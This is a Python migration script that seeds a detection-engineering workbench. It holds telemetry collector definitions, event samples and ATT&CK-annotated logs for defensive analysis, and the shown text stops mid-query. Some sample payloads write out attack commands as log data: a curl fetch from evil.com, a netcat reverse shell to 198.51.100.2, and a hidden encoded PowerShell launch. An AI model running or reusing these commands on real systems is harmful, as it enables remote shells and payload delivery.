"""Populate Phase 1: Detection Workbench tables and STIX-backed telemetry mapping."""

import json
from apps.api.app.config import get_settings
from apps.api.app.db import SupabaseDataClient

DDL = """
-- ==============================================================================
-- PHASE 1: DETECTION WORKBENCH SCHEMA (0002_detection_workbench.sql)
-- ==============================================================================

CREATE TABLE IF NOT EXISTS public.telemetry_collectors (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    os TEXT NOT NULL CHECK (os IN ('windows', 'linux', 'macos', 'cloud', 'network', 'multi')),
    category TEXT NOT NULL CHECK (category IN ('host_endpoint', 'network_sensor', 'cloud_audit', 'identity')),
    is_agentless BOOLEAN NOT NULL DEFAULT false,
    description TEXT NOT NULL,
    doc_url TEXT NOT NULL DEFAULT ''
);

CREATE TABLE IF NOT EXISTS public.collector_events (
    id TEXT PRIMARY KEY,
    collector_id TEXT NOT NULL REFERENCES public.telemetry_collectors(id) ON DELETE CASCADE,
    event_code TEXT NOT NULL,
    event_name TEXT NOT NULL,
    description TEXT NOT NULL DEFAULT '',
    sample_payload JSONB NOT NULL DEFAULT '{}'::jsonb,
    fields_schema JSONB NOT NULL DEFAULT '[]'::jsonb
);

CREATE TABLE IF NOT EXISTS public.dc_event_map (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    data_component_name TEXT NOT NULL,
    collector_id TEXT NOT NULL REFERENCES public.telemetry_collectors(id) ON DELETE CASCADE,
    collector_event_id TEXT REFERENCES public.collector_events(id) ON DELETE CASCADE,
    quality TEXT NOT NULL CHECK (quality IN ('native', 'enrichment', 'partial')),
    notes TEXT NOT NULL DEFAULT '',
    UNIQUE (data_component_name, collector_id, collector_event_id)
);

CREATE TABLE IF NOT EXISTS public.technique_telemetry_matrix (
    technique_id TEXT PRIMARY KEY,
    technique_name TEXT NOT NULL,
    tactics TEXT[] NOT NULL DEFAULT '{}',
    platforms TEXT[] NOT NULL DEFAULT '{}',
    required_dcs TEXT[] NOT NULL DEFAULT '{}',
    capable_collectors TEXT[] NOT NULL DEFAULT '{}',
    analytic_count INT NOT NULL DEFAULT 0,
    updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public.annotated_log_samples (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    technique_id TEXT NOT NULL,
    technique_name TEXT NOT NULL,
    collector_id TEXT NOT NULL REFERENCES public.telemetry_collectors(id) ON DELETE CASCADE,
    scenario_title TEXT NOT NULL,
    scenario_description TEXT NOT NULL DEFAULT '',
    raw_log JSONB NOT NULL,
    annotations JSONB NOT NULL,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- RLS policies: Public read for authenticated users, write for service_role/admin
ALTER TABLE public.telemetry_collectors ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.collector_events ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.dc_event_map ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.technique_telemetry_matrix ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.annotated_log_samples ENABLE ROW LEVEL SECURITY;

DO $$
BEGIN
    DROP POLICY IF EXISTS p_select_collectors ON public.telemetry_collectors;
    CREATE POLICY p_select_collectors ON public.telemetry_collectors FOR SELECT TO authenticated USING (true);
    
    DROP POLICY IF EXISTS p_select_collector_events ON public.collector_events;
    CREATE POLICY p_select_collector_events ON public.collector_events FOR SELECT TO authenticated USING (true);
    
    DROP POLICY IF EXISTS p_select_dc_map ON public.dc_event_map;
    CREATE POLICY p_select_dc_map ON public.dc_event_map FOR SELECT TO authenticated USING (true);
    
    DROP POLICY IF EXISTS p_select_matrix ON public.technique_telemetry_matrix;
    CREATE POLICY p_select_matrix ON public.technique_telemetry_matrix FOR SELECT TO authenticated USING (true);
    
    DROP POLICY IF EXISTS p_select_annotated_logs ON public.annotated_log_samples;
    CREATE POLICY p_select_annotated_logs ON public.annotated_log_samples FOR SELECT TO authenticated USING (true);
EXCEPTION WHEN OTHERS THEN
    NULL;
END $$;
"""

COLLECTORS = [
    {
        "id": "sysmon",
        "name": "Sysmon (Microsoft System Monitor)",
        "os": "windows",
        "category": "host_endpoint",
        "is_agentless": False,
        "description": "Agent kernel-level giám sát tiến trình, kết nối mạng, nạp driver, ghi đè file, và truy vấn DNS trên Windows với độ trung thực cao.",
        "doc_url": "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon"
    },
    {
        "id": "winevent_security",
        "name": "Windows Security Event Log (Security.evtx)",
        "os": "windows",
        "category": "host_endpoint",
        "is_agentless": True,
        "description": "Nhật ký bảo mật tích hợp sẵn trong nhân Windows (Agentless). Theo dõi xác thực Kerberos/NTLM, cấp quyền, tạo tiến trình 4688 và thay đổi chính sách.",
        "doc_url": "https://learn.microsoft.com/en-us/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection"
    },
    {
        "id": "linux_auditd",
        "name": "Linux Audit Daemon (auditd)",
        "os": "linux",
        "category": "host_endpoint",
        "is_agentless": True,
        "description": "Hệ thống kiểm toán cấp kernel của nhân Linux. Ghi lại các lệnh gọi hệ thống (SYSCALL: execve, open, connect, setuid) và truy cập tập tin nhạy cảm.",
        "doc_url": "https://github.com/linux-audit/audit-documentation"
    },
    {
        "id": "linux_ebpf",
        "name": "Linux eBPF Runtime Sensor (Tetragon / Tracee)",
        "os": "linux",
        "category": "host_endpoint",
        "is_agentless": False,
        "description": "Cảm biến an ninh hiện đại dựa trên eBPF không làm thay đổi kernel. Giám sát thời gian thực không độ trễ cho Container, K8s và Host.",
        "doc_url": "https://tetragon.io/"
    },
    {
        "id": "zeek_nsm",
        "name": "Zeek Network Security Monitor",
        "os": "network",
        "category": "network_sensor",
        "is_agentless": True,
        "description": "Công cụ phân tích lưu lượng mạng tầng ứng dụng (L7). Bóc tách có cấu trúc cho DNS, HTTP, TLS/SSL, SMB, DCE-RPC và Kerberos.",
        "doc_url": "https://zeek.org/"
    },
    {
        "id": "suricata_ids",
        "name": "Suricata Network IDS/IPS",
        "os": "network",
        "category": "network_sensor",
        "is_agentless": True,
        "description": "Hệ thống phát hiện xâm nhập mạng theo luật chữ ký (Signature-based IDS) và phân tích luồng đe dọa đa luồng tốc độ cao.",
        "doc_url": "https://suricata.io/"
    },
    {
        "id": "aws_cloudtrail",
        "name": "AWS CloudTrail",
        "os": "cloud",
        "category": "cloud_audit",
        "is_agentless": True,
        "description": "Nhật ký kiểm toán toàn bộ API calls trên hạ tầng Amazon Web Services. Phát hiện leo quyền IAM, mở bucket S3 và tắt cấu hình phòng vệ.",
        "doc_url": "https://aws.amazon.com/cloudtrail/"
    },
    {
        "id": "azure_activity",
        "name": "Microsoft Entra ID & Azure Activity",
        "os": "cloud",
        "category": "cloud_audit",
        "is_agentless": True,
        "description": "Nhật ký định danh đăng nhập Entra ID (Azure AD), đồng ý ứng dụng OAuth và thay đổi phân quyền RBAC trên tài nguyên đám mây Azure.",
        "doc_url": "https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log"
    },
    {
        "id": "mde_edr",
        "name": "Microsoft Defender for Endpoint (MDE)",
        "os": "multi",
        "category": "host_endpoint",
        "is_agentless": False,
        "description": "Nền tảng EDR đám mây thương mại của Microsoft. Cung cấp bảng dữ liệu DeviceProcessEvents, DeviceNetworkEvents, DeviceRegistryEvents nâng cao.",
        "doc_url": "https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint"
    },
    {
        "id": "osquery",
        "name": "osquery (SQL-powered OS Instrumentation)",
        "os": "multi",
        "category": "host_endpoint",
        "is_agentless": False,
        "description": "Truy vấn trạng thái hệ điều hành (tiến trình, cổng mở, cron, kernel modules) dưới dạng bảng dữ liệu SQL quan hệ.",
        "doc_url": "https://osquery.io/"
    }
]

COLLECTOR_EVENTS = [
    # Sysmon
    {
        "id": "sysmon:1",
        "collector_id": "sysmon",
        "event_code": "1",
        "event_name": "Process Creation",
        "description": "Ghi nhận tiến trình mới được sinh ra với đầy đủ CommandLine, Hashes, ParentImage, IntegrityLevel.",
        "sample_payload": {
            "EventID": 1,
            "UtcTime": "2026-11-10 14:22:01.412",
            "ProcessGuid": "{42DA94A2-9E41-655C-0000-001045231F00}",
            "ProcessId": 4820,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgA...",
            "CurrentDirectory": "C:\\Users\\victim\\Downloads\\",
            "User": "CORP\\jdoe",
            "LogonGuid": "{42DA94A2-9C80-655C-0000-0020B11A0400}",
            "LogonId": "0x41ab1",
            "TerminalSessionId": 1,
            "IntegrityLevel": "Medium",
            "Hashes": "SHA256=6D28C5F687355B4926F12C376B136C954508AE0CF85F18E9CFE12C8C67B9F408",
            "ParentProcessGuid": "{42DA94A2-9E39-655C-0000-0010F1121F00}",
            "ParentProcessId": 3216,
            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
            "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" /dde"
        },
        "fields_schema": [
            {"field": "Image", "label": "Đường dẫn tiến trình", "desc": "File thực thi nhị phân đích đang chạy."},
            {"field": "CommandLine", "label": "Tham số dòng lệnh", "desc": "Chuỗi cờ, script và tham số truyền vào lúc khởi tạo."},
            {"field": "ParentImage", "label": "Tiến trình cha", "desc": "Ứng dụng sinh ra tiến trình này (VD: Excel sinh PowerShell là dấu hiệu macro độc)."},
            {"field": "IntegrityLevel", "label": "Mức toàn vẹn", "desc": "Quyền thực thi (Low, Medium, High, System)."},
            {"field": "Hashes", "label": "Mã băm tập tin", "desc": "SHA256/MD5 của nhị phân phục vụ tra cứu Threat Intelligence."}
        ]
    },
    {
        "id": "sysmon:3",
        "collector_id": "sysmon",
        "event_code": "3",
        "event_name": "Network Connection",
        "description": "Ghi nhận kết nối TCP/UDP ra ngoài hoặc vào trong với tiến trình tương ứng.",
        "sample_payload": {
            "EventID": 3,
            "Image": "C:\\Windows\\System32\\rundll32.exe",
            "ProcessId": 5104,
            "User": "CORP\\jdoe",
            "Protocol": "tcp",
            "Initiated": True,
            "SourceIp": "192.168.1.105",
            "SourcePort": 49822,
            "DestinationIp": "198.51.100.44",
            "DestinationPort": 443,
            "DestinationHostname": "cdn-update-auth.com"
        },
        "fields_schema": [
            {"field": "DestinationIp", "label": "IP Đích", "desc": "Địa chỉ máy chủ nhận kết nối (C2 hoặc External Server)."},
            {"field": "DestinationPort", "label": "Cổng đích", "desc": "Port dịch vụ (443, 80, 53...)."},
            {"field": "DestinationHostname", "label": "Tên miền đích", "desc": "Tên miền phân giải được từ kết nối mạng."}
        ]
    },
    {
        "id": "sysmon:8",
        "collector_id": "sysmon",
        "event_code": "8",
        "event_name": "CreateRemoteThread",
        "description": "Phát hiện tiến trình này tiêm mã (injection) vào không gian nhớ của tiến trình khác.",
        "sample_payload": {
            "EventID": 8,
            "SourceImage": "C:\\Users\\Public\\loader.exe",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "TargetProcessId": 648,
            "StartAddress": "0x00007FFB34121000",
            "StartFunction": "RtlUserThreadStart"
        },
        "fields_schema": [
            {"field": "SourceImage", "label": "Tiến trình nguồn", "desc": "Ứng dụng thực hiện tiêm mã."},
            {"field": "TargetImage", "label": "Tiến trình mục tiêu", "desc": "Nạn nhân bị tiêm luồng thực thi (e.g. lsass.exe, explorer.exe)."}
        ]
    },
    {
        "id": "sysmon:11",
        "collector_id": "sysmon",
        "event_code": "11",
        "event_name": "File Create",
        "description": "Ghi nhận tập tin được tạo mới hoặc ghi đè trên đĩa.",
        "sample_payload": {
            "EventID": 11,
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "TargetFilename": "C:\\Windows\\System32\\drivers\\suspicious.sys",
            "CreationUtcTime": "2026-11-10 15:10:02.100"
        },
        "fields_schema": [
            {"field": "TargetFilename", "label": "Tập tin được tạo", "desc": "Đường dẫn tuyệt đối của file vừa xuất hiện trên hệ thống."}
        ]
    },
    {
        "id": "sysmon:13",
        "collector_id": "sysmon",
        "event_code": "13",
        "event_name": "Registry Value Set",
        "description": "Theo dõi sửa đổi khoá Registry (Persistence Run Keys, Service Config).",
        "sample_payload": {
            "EventID": 13,
            "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealthUpdate",
            "Details": "C:\\Users\\Public\\update.exe",
            "Image": "C:\\Windows\\regedit.exe"
        },
        "fields_schema": [
            {"field": "TargetObject", "label": "Khoá Registry", "desc": "Đường dẫn khoá đăng ký bị can thiệp."},
            {"field": "Details", "label": "Giá trị nạp", "desc": "Nội dung dữ liệu được gán vào Registry."}
        ]
    },
    # Windows Security
    {
        "id": "winsec:4688",
        "collector_id": "winevent_security",
        "event_code": "4688",
        "event_name": "A new process has been created",
        "description": "Sự kiện kiểm toán chuẩn Windows khi tiến trình khởi tạo (Cần bật Audit Process Creation + CommandLine).",
        "sample_payload": {
            "EventID": 4688,
            "SubjectUserName": "Administrator",
            "SubjectDomainName": "CORP",
            "NewProcessName": "C:\\Windows\\System32\\whoami.exe",
            "CommandLine": "whoami /groups /priv",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "TokenElevationType": "%%1936 (Full Elevated)"
        },
        "fields_schema": [
            {"field": "NewProcessName", "label": "Tiến trình mới", "desc": "Nhị phân được thực thi."},
            {"field": "TokenElevationType", "label": "Trạng thái UAC", "desc": "Quyền hạn token (Default, Limited, Full Elevated)."}
        ]
    },
    {
        "id": "winsec:4624",
        "collector_id": "winevent_security",
        "event_code": "4624",
        "event_name": "An account was successfully logged on",
        "description": "Đăng nhập thành công với chi tiết LogonType (Type 3: Network, Type 10: RDP, Type 2: Interactive).",
        "sample_payload": {
            "EventID": 4624,
            "TargetUserName": "svc_backup",
            "LogonType": 3,
            "LogonProcessName": "Kerberos",
            "IpAddress": "10.0.4.15",
            "WorkstationName": "WKSTN-FINANCE01"
        },
        "fields_schema": [
            {"field": "LogonType", "label": "Kiểu đăng nhập", "desc": "2 (Bàn phím), 3 (Qua mạng SMB/RPC), 10 (Remote Desktop), 4 (Batch/Task)."},
            {"field": "IpAddress", "label": "Địa chỉ IP nguồn", "desc": "Máy phát sinh yêu cầu đăng nhập."}
        ]
    },
    {
        "id": "winsec:7045",
        "collector_id": "winevent_security",
        "event_code": "7045",
        "event_name": "A service was installed in the system",
        "description": "Phát hiện dịch vụ Windows mới được cài đặt (Thường dùng trong Lateral Movement / Persistence).",
        "sample_payload": {
            "EventID": 7045,
            "ServiceName": "BfsMaintenanceSvc",
            "ImagePath": "%SystemRoot%\\System32\\svchost.exe -k netsvcs",
            "ServiceType": "user mode service",
            "StartType": "auto start",
            "AccountName": "LocalSystem"
        },
        "fields_schema": [
            {"field": "ServiceName", "label": "Tên dịch vụ", "desc": "Tên service mới xuất hiện."},
            {"field": "ImagePath", "label": "Đường dẫn thực thi", "desc": "Lệnh hoặc binary dịch vụ sẽ chạy khi khởi động."}
        ]
    },
    # Linux auditd
    {
        "id": "auditd:execve",
        "collector_id": "linux_auditd",
        "event_code": "execve",
        "event_name": "SYSCALL execve",
        "description": "Ghi nhận system call thực thi file trên Linux kèm chuỗi tham số `a0`, `a1`, `a2`.",
        "sample_payload": {
            "type": "SYSCALL",
            "syscall": 59,
            "arch": "c000003e",
            "success": "yes",
            "exit": 0,
            "comm": "curl",
            "exe": "/usr/bin/curl",
            "a0": "curl",
            "a1": "-s",
            "a2": "http://evil.com/sh.elf",
            "uid": 1000,
            "euid": 0,
            "auid": 1000
        },
        "fields_schema": [
            {"field": "exe", "label": "Đường dẫn thực thi", "desc": "Binary trên file system Linux."},
            {"field": "euid", "label": "Effective UID", "desc": "0 là quyền root (nếu chênh lệch với uid là dấu hiệu leo quyền)."}
        ]
    },
    # Linux eBPF
    {
        "id": "ebpf:process_exec",
        "collector_id": "linux_ebpf",
        "event_code": "process_exec",
        "event_name": "Tetragon process_exec",
        "description": "Bắt sự kiện thực thi tiến trình không độ trễ trong kernel bằng kprobe eBPF.",
        "sample_payload": {
            "process": {
                "exec_id": "azA2Zjg3ZjA",
                "binary": "/bin/busybox",
                "arguments": "nc 198.51.100.2 4444 -e /bin/sh",
                "pod": {"name": "frontend-api-5d468-x", "namespace": "prod"}
            },
            "parent": {
                "binary": "/usr/local/bin/node"
            }
        },
        "fields_schema": [
            {"field": "arguments", "label": "Đối số tiến trình", "desc": "Toàn bộ lệnh reverse shell hoặc lệnh nhị phân."},
            {"field": "pod", "label": "Bối cảnh Container / K8s", "desc": "Tên Pod, Namespace và Container ID."}
        ]
    },
    # Zeek
    {
        "id": "zeek:dns",
        "collector_id": "zeek_nsm",
        "event_code": "dns",
        "event_name": "Zeek dns.log",
        "description": "Nhật ký truy vấn DNS phân tích từ network traffic: qtype, query, answers, TTL.",
        "sample_payload": {
            "ts": 1731248000.12,
            "uid": "CHg0Z349YvQjD",
            "id.orig_h": "10.0.1.25",
            "id.resp_h": "10.0.0.2",
            "proto": "udp",
            "query": "4a646566656e646572.tunnel.c2domain.net",
            "qtype_name": "TXT",
            "rcode_name": "NOERROR",
            "answers": ["\"encoded_payload_string...\""]
        },
        "fields_schema": [
            {"field": "query", "label": "Tên miền truy vấn", "desc": "Domain name (Phát hiện DNS tunneling nếu query dài và có entropy cao)."},
            {"field": "qtype_name", "label": "Loại bản ghi", "desc": "A, AAAA, TXT (thường dùng chuyển dữ liệu lén)."}
        ]
    }
]

DC_MAPPINGS = [
    # Process Creation
    ("Process Creation", "sysmon", "sysmon:1", "native", "Sysmon EventID 1 cung cấp đầy đủ CommandLine, ParentImage và Hashes"),
    ("Process Creation", "winevent_security", "winsec:4688", "native", "Security.evtx 4688 hỗ trợ sẵn trên mọi Windows Server"),
    ("Process Creation", "linux_auditd", "auditd:execve", "native", "auditd SYSCALL 59 (execve) bắt toàn bộ tiến trình"),
    ("Process Creation", "linux_ebpf", "ebpf:process_exec", "native", "eBPF Tetragon giám sát không độ trễ trong container"),
    ("Process Creation", "mde_edr", None, "native", "DeviceProcessEvents trên Microsoft Defender for Endpoint"),
    ("Process Creation", "osquery", None, "enrichment", "Bảng processes định kỳ hoặc qua process_events"),

    # Network Connection
    ("Network Connection", "sysmon", "sysmon:3", "native", "Sysmon EventID 3 liên kết trực tiếp tiến trình với IP/Port đích"),
    ("Network Connection", "zeek_nsm", None, "native", "Zeek conn.log phân tích toàn bộ phiên TCP/UDP trên dây cáp mạng"),
    ("Network Connection", "suricata_ids", None, "native", "Suricata flow và alert events"),
    ("Network Connection", "linux_ebpf", None, "native", "eBPF kprobe tcp_connect / udp_sendmsg"),
    ("Network Connection", "mde_edr", None, "native", "DeviceNetworkEvents"),

    # User Account Authentication
    ("User Account Authentication", "winevent_security", "winsec:4624", "native", "Security.evtx 4624/4625 theo dõi LogonType và Source IP"),
    ("User Account Authentication", "aws_cloudtrail", None, "native", "ConsoleLogin, AssumeRole API calls"),
    ("User Account Authentication", "azure_activity", None, "native", "Entra ID SignInLogs"),
    ("User Account Authentication", "linux_auditd", None, "native", "PAM auth logs / auditd USER_AUTH"),

    # File Creation / Modification
    ("File Creation", "sysmon", "sysmon:11", "native", "Sysmon EventID 11 ghi nhận file xuất hiện"),
    ("File Creation", "linux_auditd", None, "native", "auditd PATH / openat with O_CREAT"),
    ("File Creation", "mde_edr", None, "native", "DeviceFileEvents"),

    # Process Injection / Access
    ("Process Access", "sysmon", "sysmon:8", "native", "Sysmon EventID 8 (CreateRemoteThread) & EventID 10 (ProcessAccess)"),
    ("Process Access", "linux_ebpf", None, "native", "eBPF ptrace / vm_write monitoring"),

    # Windows Service Creation
    ("Service Creation", "winevent_security", "winsec:7045", "native", "Security.evtx 7045 / System.evtx 7045"),
    ("Service Creation", "sysmon", None, "enrichment", "Sysmon EventID 1 với services.exe hoặc sc.exe"),

    # Scheduled Job Creation
    ("Scheduled Job Creation", "winevent_security", None, "native", "Security.evtx 4698 (A scheduled task was created)"),
    ("Scheduled Job Creation", "linux_auditd", None, "native", "auditd giám sát thư mục /etc/cron* và /var/spool/cron"),

    # DNS Query
    ("DNS Query", "sysmon", None, "native", "Sysmon EventID 22 (DNS query)"),
    ("DNS Query", "zeek_nsm", "zeek:dns", "native", "Zeek dns.log với đầy đủ subdomains và responses")
]

ANNOTATED_SAMPLES = [
    {
        "technique_id": "T1059.001",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "collector_id": "sysmon",
        "scenario_title": "Tấn công Macro Office sinh PowerShell ẩn danh tải Payload độc hại",
        "scenario_description": "Nạn nhân mở file hóa đơn .xlsm chứa mã VBA macro, Excel lập tức spawn PowerShell với tham số mã hóa Base64 và cờ giấu cửa sổ WindowStyle Hidden.",
        "raw_log": {
            "EventID": 1,
            "UtcTime": "2026-11-10 14:22:01.412",
            "ProcessId": 4820,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgA...",
            "CurrentDirectory": "C:\\Users\\victim\\AppData\\Local\\Temp\\",
            "User": "CORP\\kevin.mitnick",
            "IntegrityLevel": "Medium",
            "Hashes": "SHA256=6D28C5F687355B4926F12C376B136C954508AE0CF85F18E9CFE12C8C67B9F408",
            "ParentProcessId": 3216,
            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
            "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\victim\\Downloads\\Invoice_Q3.xlsm\""
        },
        "annotations": {
            "Image": "Trình thông dịch PowerShell chính hãng của Microsoft. Kẻ tấn công lợi dụng công cụ có sẵn trên hệ thống (Living off the Land - LotL) để né tránh sự chú ý.",
            "ParentImage": "DẤU HIỆU ĐỘC NGUY HIỂM CAO: Phần mềm văn phòng Excel.EXE sinh tiến trình con là PowerShell.EXE. Trong 99.9% môi trường doanh nghiệp bình thường, ứng dụng Office không bao giờ gọi PowerShell trực tiếp.",
            "CommandLine": "Tham số `-NoP` (bỏ qua profile cấu hình), `-NonI` (phi tương tác), `-W Hidden` (ẩn hoàn toàn cửa sổ dòng lệnh để nạn nhân không biết), `-Exec Bypass` (vượt qua Execution Policy), `-Enc` (chuỗi lệnh Base64 mã hóa để che giấu URL tải payload).",
            "IntegrityLevel": "Medium: Quyền người dùng thông thường. Sau khi thực thi thành công, kẻ tấn công sẽ tiến hành leo quyền (Privilege Escalation) lên High hoặc System.",
            "CurrentDirectory": "Thư mục tạm AppData\\Local\\Temp: Nơi thường xuyên được mã độc sử dụng để ghi các tập tin trung gian."
        }
    },
    {
        "technique_id": "T1055",
        "technique_name": "Process Injection",
        "collector_id": "sysmon",
        "scenario_title": "Tiêm luồng thực thi (CreateRemoteThread) vào tiến trình xác thực LSASS",
        "scenario_description": "Tiến trình loader độc hại mở handle và tạo một thread mới trong lsass.exe để đọc trộm hash mật khẩu từ bộ nhớ (Mimikatz / Nanodump).",
        "raw_log": {
            "EventID": 8,
            "UtcTime": "2026-11-10 16:45:11.890",
            "SourceProcessId": 5912,
            "SourceImage": "C:\\Users\\Public\\Downloads\\agent_svc.exe",
            "TargetProcessId": 648,
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "StartAddress": "0x00007FFD2B1410A0",
            "StartFunction": "RtlUserThreadStart"
        },
        "annotations": {
            "SourceImage": "Ứng dụng nguồn chạy từ thư mục C:\\Users\\Public (thư mục chia sẻ công cộng không đòi hỏi quyền Admin để ghi file).",
            "TargetImage": "LSASS.EXE (Local Security Authority Subsystem Service): Tiến trình nắm giữ chìa khóa bảo mật và cache mật khẩu của Windows.",
            "StartAddress": "Địa chỉ bộ nhớ mục tiêu nơi thread mới bắt đầu chạy. Nếu vùng nhớ này có thuộc tính PAGE_EXECUTE_READWRITE (RWX) không liên kết với file DLL hợp lệ trên đĩa, đây là bằng chứng tiêm Shellcode."
        }
    },
    {
        "technique_id": "T1053.005",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "collector_id": "winevent_security",
        "scenario_title": "Tạo tác vụ lịch trình ẩn danh duy trì sự hiện diện bền vững (Persistence)",
        "scenario_description": "Mã độc tạo một scheduled task tên OneDriveHealthCheck để tự động chạy lại nhị phân độc hại mỗi khi hệ thống khởi động hoặc mỗi 60 phút.",
        "raw_log": {
            "EventID": 4698,
            "SubjectUserName": "SYSTEM",
            "SubjectDomainName": "NT AUTHORITY",
            "TaskName": "\\Microsoft\\Windows\\OneDrive\\OneDriveHealthCheck",
            "TaskContent": "<?xml version=\"1.0\"?><Task><Triggers><BootTrigger/></Triggers><Actions><Exec><Command>C:\\ProgramData\\updater.exe</Command></Exec></Actions></Task>"
        },
        "annotations": {
            "EventID": "Event 4698 được phát ra từ kênh Security.evtx của Windows khi có bất kỳ tác vụ nào được tạo thành công.",
            "TaskName": "Kỹ thuật ngụy trang (Masquerading): Đặt tên tác vụ trông giống như của Microsoft OneDrive để đánh lừa chuyên viên phân tích khi rà soát Task Scheduler.",
            "TaskContent": "Lệnh chỉ định thực thi C:\\ProgramData\\updater.exe ngay khi hệ thống vừa khởi động (BootTrigger)."
        }
    }
]


def run():
    print("[*] Bắt đầu migration Phase 1: Detection Workbench...")
    client = SupabaseDataClient()
    settings = get_settings()

    with client.get_pg_conn() as conn:
        with conn.cursor() as cur:
            # 1. Chạy DDL
            print("[*] Áp dụng DDL...")
            cur.execute(DDL)

            # 2. Seed collectors
            print("[*] Nạp telemetry_collectors...")
            for c in COLLECTORS:
                cur.execute("""
                    INSERT INTO public.telemetry_collectors (id, name, os, category, is_agentless, description, doc_url)
                    VALUES (%s, %s, %s, %s, %s, %s, %s)
                    ON CONFLICT (id) DO UPDATE SET
                        name = EXCLUDED.name,
                        os = EXCLUDED.os,
                        category = EXCLUDED.category,
                        is_agentless = EXCLUDED.is_agentless,
                        description = EXCLUDED.description,
                        doc_url = EXCLUDED.doc_url;
                """, (c['id'], c['name'], c['os'], c['category'], c['is_agentless'], c['description'], c['doc_url']))

            # 3. Seed collector events
            print("[*] Nạp collector_events...")
            for e in COLLECTOR_EVENTS:
                cur.execute("""
                    INSERT INTO public.collector_events (id, collector_id, event_code, event_name, description, sample_payload, fields_schema)
                    VALUES (%s, %s, %s, %s, %s, %s, %s)
                    ON CONFLICT (id) DO UPDATE SET
                        event_name = EXCLUDED.event_name,
                        description = EXCLUDED.description,
                        sample_payload = EXCLUDED.sample_payload,
                        fields_schema = EXCLUDED.fields_schema;
                """, (
                    e['id'], e['collector_id'], e['event_code'], e['event_name'],
                    e['description'], json.dumps(e['sample_payload']), json.dumps(e['fields_schema'])
                ))

            # 4. Seed dc_event_map
            print("[*] Nạp dc_event_map...")
            for dc, col_id, evt_id, qual, notes in DC_MAPPINGS:
                cur.execute("""
                    INSERT INTO public.dc_event_map (data_component_name, collector_id, collector_event_id, quality, notes)
                    VALUES (%s, %s, %s, %s, %s)
                    ON CONFLICT (data_component_name, collector_id, collector_event_id) DO UPDATE SET
                        quality = EXCLUDED.quality,
                        notes = EXCLUDED.notes;
                """, (dc, col_id, evt_id, qual, notes))

            # 5. Populate technique_telemetry_matrix from STIX data
            print("[*] Xây dựng ma trận technique_telemetry_matrix từ STIX...")
            cur.execute("""
                WITH tech_analytics AS (
                    -- Liên kết Technique với Analytics qua quan hệ detects
                    SELECT 
                        t.attack_id AS technique_id,
                        t.name AS technique_name,
                        t.tactics,
                        t.platforms,
                        an.attack_id AS analytic_id,
                        an.data AS analytic_data
                    FROM public.attack_objects t
                    JOIN public.attack_relationships r ON r.target_ref = t.stix_id AND r.rel_type = 'detects'
                    JOIN public.attack_objects det ON det.stix_id = r.source_ref AND det.type = 'x-mitre-detection-strategy'
                    -- Lấy analytic_refs từ detection strategy
                    CROSS JOIN LATERAL jsonb_array_elements_text(det.data->'analytic_refs') AS an_stix_id
                    JOIN public.attack_objects an ON an.stix_id = an_stix_id AND an.type = 'x-mitre-analytic'
                    WHERE t.type = 'attack-pattern' AND t.domain = 'enterprise-attack'
                ),
                tech_log_sources AS (
                    -- Trích xuất các nguồn log được đề xuất trong analytic
                    SELECT 
                        technique_id,
                        technique_name,
                        tactics,
                        platforms,
                        analytic_id,
                        elem->>'name' AS log_name,
                        elem->>'channel' AS log_channel
                    FROM tech_analytics,
                         LATERAL jsonb_array_elements(analytic_data->'log_source_references') AS elem
                ),
                mapped_collectors AS (
                    SELECT 
                        tls.technique_id,
                        tls.technique_name,
                        tls.tactics,
                        tls.platforms,
                        COUNT(DISTINCT tls.analytic_id) AS analytic_count,
                        ARRAY_AGG(DISTINCT tls.log_name) FILTER (WHERE tls.log_name IS NOT NULL) AS raw_sources,
                        ARRAY_AGG(DISTINCT 
                            CASE 
                                WHEN tls.log_name ILIKE '%sysmon%' THEN 'sysmon'
                                WHEN tls.log_name ILIKE '%security%' THEN 'winevent_security'
                                WHEN tls.log_name ILIKE '%auditd%' THEN 'linux_auditd'
                                WHEN tls.log_name ILIKE '%ebpf%' THEN 'linux_ebpf'
                                WHEN tls.log_name ILIKE '%zeek%' OR tls.log_name ILIKE '%nsm%' THEN 'zeek_nsm'
                                WHEN tls.log_name ILIKE '%cloudtrail%' THEN 'aws_cloudtrail'
                                WHEN tls.log_name ILIKE '%azure%' OR tls.log_name ILIKE '%entra%' THEN 'azure_activity'
                                WHEN tls.log_name ILIKE '%mde%' OR tls.log_name ILIKE '%defender%' THEN 'mde_edr'
                                ELSE NULL
                            END
                        ) FILTER (WHERE 
                            tls.log_name ILIKE '%sysmon%' OR 
                            tls.log_name ILIKE '%security%' OR 
                            tls.log_name ILIKE '%auditd%' OR 
